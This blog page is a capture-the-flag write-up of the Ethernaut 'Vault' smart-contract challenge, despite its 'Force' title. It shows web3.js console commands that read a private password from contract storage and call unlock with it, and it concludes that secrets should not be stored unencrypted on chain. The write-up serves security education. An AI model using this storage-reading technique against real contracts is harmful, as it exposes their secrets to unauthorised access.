<!doctype html><html lang=en><head><title>Force - Ethernaut :: DimitrisV SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="On this challenge, we have to unlock the vault to win the challenge.
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } First of all, we can see that we have 2 state variables. One of them is the locked variable which is public."><meta name=keywords content="linux"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/vault/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content="DimitrisV"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Force - Ethernaut"><meta property="og:description" content="On this challenge, we have to unlock the vault to win the challenge.
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } First of all, we can see that we have 2 state variables. One of them is the locked variable which is public."><meta property="og:url" content="/blockchain_writeups/vault/"><meta property="og:site_name" content="DimitrisV SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-01-08 00:00:00 +0000 UTC"></head><body class=pink><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>DimitrisV SV1SJP</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/blockchain_writeups/vault/>Force - Ethernaut</a></h1><div class=post-meta><span class=post-date>2022-01-08</span>
<span class=post-author>:: DimitrisV</span></div><div class=post-content><div><p>On this challenge, we have to unlock the vault to win the challenge.</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
</code></pre><p>First of all, we can see that we have 2 state variables. One of them is the locked variable which is public. That means that we can very easily see what it is inside the variable by typing:</p><pre tabindex=0><code>await contract.locked()
</code></pre><p>Also, we have the private variable password. Using the console, we cannot just see what it is inside just easily. Therefore, we have 2 options to try in order to solve the problem.</p><ul><li>By brute forcing the password, until we find the right one and then unlock the vault. It&rsquo;s possible to happen, but there is a much easier way to achieve this.</li><li>Somehow, to dump the password from the storage of the contract.</li></ul><p>As we have already mentioned earlier, Ethereum is a public Blockchain. That means that everyone can see what exists inside of it. We know that password variable is uint private. In Ethereum from the Solidity Docs, we know that a private type access mean that a variable can be called only from the same smart-contract, not externally by using an another smart-contract or by calling contract.password() from console. As Ethereum is a public ledger, we can just query the smart-contract from it&rsquo;s storage.
Web3.js can help us achieving this, by typing in console:</p><pre tabindex=0><code>var pwd // to create a variable 
web3.eth.getStorageAt(contract.address, 1,  function(err, result){pwd = result})
</code></pre><p>This command will return :</p><pre tabindex=0><code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29
</code></pre><p>That is the password in hexadecimal mode. We can very easily convert this hexadecimal in Ascii from our console by typing:</p><pre tabindex=0><code>web3.utils.toAscii(pwd)
</code></pre><p>And this will return us:</p><pre tabindex=0><code>A very strong secret password :)
</code></pre><p>As we have the hexadecimal version of the password, we can simply create a transaction in the function unlock and the hexadecimal value as an input by typing:</p><pre tabindex=0><code>contract.unlock(&#34;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#34;)
</code></pre><p>Now if we check the Boolean variable locked by typing &ldquo;contract.locked()&rdquo; we can see that it is unlocked. We pwned it.
To sum up, we should never insert data unencrypted in Blockchain networks, especially in public Blockchains, as everyone can see what it is inside.</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><a href=https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf>Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas</a></li></ul><ul><li><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here</a></li></ul></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>Dimitris LinuxOS 2011-2022</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
<script src=/assets/languageSelector.js></script></div></body></html>